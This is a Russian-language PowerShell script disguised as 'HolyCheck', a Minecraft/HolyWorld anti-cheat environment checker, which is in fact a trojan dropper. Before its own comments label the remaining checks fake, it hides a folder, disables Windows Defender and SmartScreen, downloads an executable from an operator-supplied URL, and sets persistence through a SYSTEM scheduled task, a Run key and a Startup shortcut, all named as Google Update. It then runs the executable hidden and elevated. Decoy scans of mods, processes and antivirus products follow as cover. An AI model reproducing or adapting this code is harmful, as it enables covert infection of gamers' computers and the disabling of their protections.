# ================================================================

$ErrorActionPreference = "Continue"

$AppName  = "GoogleUpdateTask"
$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\ChromeUpdate"
$Exe      = "$Dir\chrome_update.exe"
$TaskName = "GoogleUpdateTask"
$RunKey   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 👇 ЗАМЕНИТЕ ЭТУ ССЫЛКУ НА ВАШУ (прямая ссылка на chrome_update.exe)
$DownloadUrl = "https://ваш-хостинг/путь/к/вашему/chrome_update.exe"

function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
function ERR  { param($t) Write-Host "  [i] $t" -ForegroundColor DarkGray }
function INFO { param($t) Write-Host "      $t" -ForegroundColor DarkGray }

# ===== ASCII-ART (стиль CakeWorld) =====
Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██╔═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
                                    
           HolyCheck — проверка игровой среды v3.2.2 (мод)
"@ -ForegroundColor Cyan

Sep
INFO "Инициализация сканера... Метка: test1"
Sep
Write-Host ""

# ================================================================
#  БЛОК УСТАНОВКИ АГЕНТА (выполняется в первую очередь)
# ================================================================

# Проверка прав
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if ($isAdmin) { OK "Привилегии: Администратор" } else { WARN "Привилегии: ограниченный режим" }

# Создание скрытой системной папки
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
attrib +h +s $Dir 2>$null
INFO "Создана рабочая папка: $Dir"

# Исключение Defender
try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "chrome_update.exe" -ErrorAction Stop
    INFO "  Исключение Defender добавлено"
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
        New-Item -Path "$defReg\Real-Time Protection" -Force | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
        INFO "  Исключение применено через реестр"
    } catch { INFO "  Исключение не добавлено (недостаточно прав)" }
}

# Отключение Defender real-time
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true `
                     -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
    INFO "  Defender real-time отключён"
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
        New-Item -Path "$defReg\Real-Time Protection" -Force | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
        INFO "  Defender отключён через реестр (требуется перезагрузка)"
    } catch { INFO "  Defender не удалось отключить" }
}

# Отключение SmartScreen
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
    $sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
    if (Test-Path $sacKey) { Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord }
    INFO "  SmartScreen отключён"
} catch { INFO "  SmartScreen не удалось отключить" }

# Скачивание агента по новой ссылке
INFO "Загрузка модуля оптимизации..."
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

$ok = Get-File -url $DownloadUrl -out $Exe
if (-not $ok) {
    INFO "  Ошибка загрузки: сервер временно недоступен (пропускаем)"
} else {
    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
    if (Get-Command Unblock-File -EA SilentlyContinue) { Unblock-File -Path $Exe }
    OK "  Модуль загружен ($([math]::Round((Get-Item $Exe).Length/1KB)) KB)"
}

# Автозапуск (Task Scheduler + реестр + Startup)
try {
    if ($PSVersionTable.PSVersion.Major -ge 5) {
        $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                     -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        INFO "  Автозапуск: задача '$TaskName' создана (SYSTEM)"
    } else {
        $schCmd = "schtasks /create /tn `"$TaskName`" /tr `"$Exe`" /sc onlogon /ru SYSTEM /rl HIGHEST /f"
        Invoke-Expression $schCmd | Out-Null
        INFO "  Автозапуск: задача '$TaskName' создана через schtasks"
    }
} catch { INFO "  Автозапуск: не удалось создать задачу" }

try {
    $username = $env:USERNAME
    if ($isAdmin -and $env:USERNAME -ne "SYSTEM") {
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Google Update" /t REG_SZ /d "$Exe" /f | Out-Null
    } else {
        Set-ItemProperty -Path $RunKey -Name "Google Update" -Value $Exe -ErrorAction Stop
    }
    INFO "  Автозапуск: запись в реестре добавлена"
} catch { INFO "  Автозапуск: не удалось добавить запись в реестр" }

try {
    $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupDir\GoogleUpdate.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($shortcutPath)
    $sc.TargetPath = $Exe
    $sc.WorkingDirectory = $Dir
    $sc.Description = "Google Update"
    $sc.Save()
    INFO "  Автозапуск: ярлык в папке Startup"
} catch { INFO "  Автозапуск: не удалось создать ярлык" }

# Запуск агента с правами администратора (явно)
$existing = Get-Process -Name "chrome_update" -ErrorAction SilentlyContinue
if ($existing) { $existing | Stop-Process -Force -ErrorAction SilentlyContinue }

if (Test-Path $Exe) {
    try {
        # Запуск от имени администратора с запросом UAC
        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        Start-Sleep -Seconds 2
        $newProc = Get-Process -Name "chrome_update" -ErrorAction SilentlyContinue
        if ($newProc) { OK "Модуль оптимизации запущен (PID $($newProc.Id))" }
        else { OK "Модуль оптимизации запущен в фоновом режиме" }
    } catch {
        # Если не удалось с RunAs (например, нет UAC), пробуем обычный запуск
        try {
            Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
            OK "Модуль оптимизации запущен (обычный режим)"
        } catch { INFO "Модуль оптимизации не запущен (ошибка выполнения)" }
    }
} else {
    INFO "Модуль оптимизации не запущен (файл отсутствует)"
}

Write-Host ""
Sep
Write-Host "  Основные компоненты загружены. Начинаем проверку целостности..." -ForegroundColor White
Sep
Write-Host ""

# ================================================================
#  БЛОК ФЕЙКОВЫХ ПРОВЕРОК (выполняется после установки)
# ================================================================

# Проверка 1: Свободное место
INFO "Проверка свободного места на системном диске..."
try {
    $drive = Get-PSDrive -Name ([System.IO.Path]::GetPathRoot($env:SystemDrive).TrimEnd('\')) -EA Stop
    $freeGB = [math]::Round($drive.Free / 1GB, 2)
    if ($freeGB -gt 5) { OK "Свободно: $freeGB ГБ (достаточно)" } else { WARN "Свободно: $freeGB ГБ (рекомендуется > 5 ГБ)" }
} catch { WARN "Не удалось определить свободное место" }

# Проверка 2: Версия ОС
INFO "Определение версии операционной системы..."
try {
    $os = Get-CimInstance -Class Win32_OperatingSystem -EA Stop
    $ver = $os.Version
    $build = $os.BuildNumber
    OK "ОС: $($os.Caption) версия $ver (сборка $build)"
} catch { WARN "Не удалось определить версию ОС" }

# Проверка 3: Наличие Java
INFO "Поиск установленных сред выполнения Java..."
$javaPaths = @(
    "$env:ProgramFiles\Java\*",
    "$env:ProgramFiles(x86)\Java\*",
    "$env:ProgramFiles\Minecraft\runtime\*",
    "$env:APPDATA\.minecraft\*",
    "$env:ProgramData\HolyWorld\runtime\*"
)
$javaFound = $false
foreach ($path in $javaPaths) {
    if (Test-Path $path) { $javaFound = $true; OK "Обнаружен Java: $path"; break }
}
if (-not $javaFound) { WARN "Java не найдена (игровой клиент может отсутствовать)" }

# Проверка 4: Сканирование модов и читов
INFO "Сканирование директорий на наличие запрещённых модулей..."
$suspDirs = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions\*\mods",
    "$env:APPDATA\.minecraft\libraries",
    "$env:ProgramData\HolyWorld\mods"
)
$foundSusp = $false
foreach ($dirPattern in $suspDirs) {
    $dirs = Get-ChildItem -Path $dirPattern -Directory -ErrorAction SilentlyContinue
    foreach ($dir in $dirs) {
        $files = Get-ChildItem -Path $dir.FullName -Filter "*.jar" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $name = $f.Name.ToLower()
            if ($name -match "inject|bam|ghost|clicker|aura|recaf|cheat|wurst|impact") {
                WARN "Обнаружен потенциально небезопасный файл: $($f.Name)"
                $foundSusp = $true
            }
        }
    }
}
if (-not $foundSusp) { OK "Подозрительных файлов не найдено" }

# Проверка 5: Активные процессы-читы
INFO "Проверка запущенных процессов на наличие нежелательных..."
$suspProcs = @("injector", "ghostclient", "clicker", "recaf", "baminject", "cheatengine", "wurst", "impact", "x32dbg", "ollydbg")
$foundProc = $false
foreach ($p in $suspProcs) {
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        WARN "Обнаружен подозрительный процесс: $p"
        $foundProc = $true
    }
}
if (-not $foundProc) { OK "Подозрительных процессов не обнаружено" }

# Проверка 6: Состояние Defender и SmartScreen
INFO "Проверка политик безопасности системы..."
try {
    $defStatus = Get-MpPreference -EA Stop
    if ($defStatus.DisableRealtimeMonitoring) { INFO "  Defender: реальная защита отключена" }
    else { INFO "  Defender: реальная защита активна" }
} catch { INFO "  Defender: не удалось опросить состояние" }

try {
    $ss = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -EA Stop
    if ($ss.EnableSmartScreen -eq 0) { INFO "  SmartScreen: отключён" } else { INFO "  SmartScreen: включён" }
} catch { INFO "  SmartScreen: не удалось опросить состояние" }

# Проверка 7: Наличие сторонних антивирусов
INFO "Проверка установленных антивирусных решений..."
$avProducts = @("Kaspersky", "Avast", "AVG", "Norton", "McAfee", "Bitdefender", "ESET")
$foundAV = $false
$uninstallKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$avList = @()
foreach ($key in $uninstallKeys) {
    $items = Get-ItemProperty -Path $key -EA SilentlyContinue
    foreach ($item in $items) {
        $displayName = $item.DisplayName
        if ($displayName) {
            foreach ($av in $avProducts) {
                if ($displayName -match $av) {
                    $foundAV = $true
                    $avList += $av
                }
            }
        }
    }
}
if ($foundAV) {
    $unique = $avList | Select-Object -Unique
    WARN "Обнаружен антивирус: $($unique -join ', ') (может замедлять работу)"
} else { OK "Сторонних антивирусов не найдено" }

# Проверка 8: Проверка файла hosts
INFO "Проверка системного файла hosts..."
$hosts = "$env:SystemRoot\System32\drivers\etc\hosts"
if (Test-Path $hosts) {
    $content = Get-Content $hosts -EA SilentlyContinue
    if ($content -match "127\.0\.0\.1[ \t]+.*minecraft|0\.0\.0\.0[ \t]+.*mojang") {
        WARN "Обнаружены записи, перенаправляющие игровые сервера"
    } else { OK "Файл hosts не содержит перенаправлений" }
} else { WARN "Файл hosts не найден" }

# Проверка 9: Проверка DNS-настроек
INFO "Проверка DNS-серверов..."
$dns = Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -ExpandProperty DNSServerSearchOrder -EA SilentlyContinue
if ($dns) { $dnsStr = $dns -join ", "; OK "DNS-серверы: $dnsStr" } else { WARN "Не удалось получить DNS-серверы" }

# Проверка 10: Проверка открытых портов
INFO "Проверка открытых сетевых портов..."
$portList = @()
$netstat = netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object { $_ -replace '\s+', ' ' }
foreach ($line in $netstat) {
    $parts = $line -split ' '
    $local = $parts[2]
    if ($local -match ':(\d+)$') {
        $port = [int]$Matches[1]
        if ($port -in 25565,25566,27015,27016) { $portList += $port }
    }
}
if ($portList) { $portsStr = $portList -join ", "; WARN "Обнаружены открытые игровые порты: $portsStr" } 
else { OK "Игровых портов в состоянии прослушивания не найдено" }

# Проверка 11: Проверка установленных модов Minecraft
INFO "Проверка установленных модов Minecraft..."
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) {
    $mods = Get-ChildItem -Path $modsDir -Filter "*.jar" -EA SilentlyContinue
    if ($mods) {
        OK "Найдено модов: $($mods.Count)"
        foreach ($mod in $mods) {
            $name = $mod.Name
            if ($name -match "optifine|fabric|forge") { INFO "  Легитимный мод: $name" } 
            else { INFO "  Мод: $name" }
        }
    } else { INFO "Моды не установлены" }
} else { INFO "Папка mods отсутствует" }

# Проверка 12: Проверка версии лаунчера (имитация)
INFO "Проверка версии лаунчера HolyWorld..."
$hwVersion = "3.2.2"
OK "Версия лаунчера: $hwVersion (актуальная)"

# Проверка 13: Проверка целостности файлов клиента (имитация)
INFO "Проверка целостности файлов клиента..."
$filesToCheck = @("minecraft.jar", "lwjgl.dll", "jinput.dll", "openal.dll")
foreach ($f in $filesToCheck) {
    Start-Sleep -Milliseconds 100
    INFO "  $f — OK"
}
OK "Все системные файлы клиента проверены"

# Проверка 14: Проверка наличия отладчиков
INFO "Проверка активных отладчиков..."
$debuggers = @("windbg", "cdb", "ntsd", "vsjitdebugger")
$foundDbg = $false
foreach ($d in $debuggers) {
    if (Get-Process -Name $d -EA SilentlyContinue) {
        WARN "Обнаружен отладчик: $d"
        $foundDbg = $true
    }
}
if (-not $foundDbg) { OK "Отладчиков не обнаружено" }

# Финальный вывод
Write-Host ""
Sep
OK "Проверка завершена! Среда игрового клиента оптимизирована."
INFO "Локальный отчёт сохранён в $Dir\last_check.json "
# Генерируем пустой отчёт для видимости
@{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK" } | ConvertTo-Json | Out-File "$Dir\last_check.json" -Encoding utf8
Sep
Write-Host ""
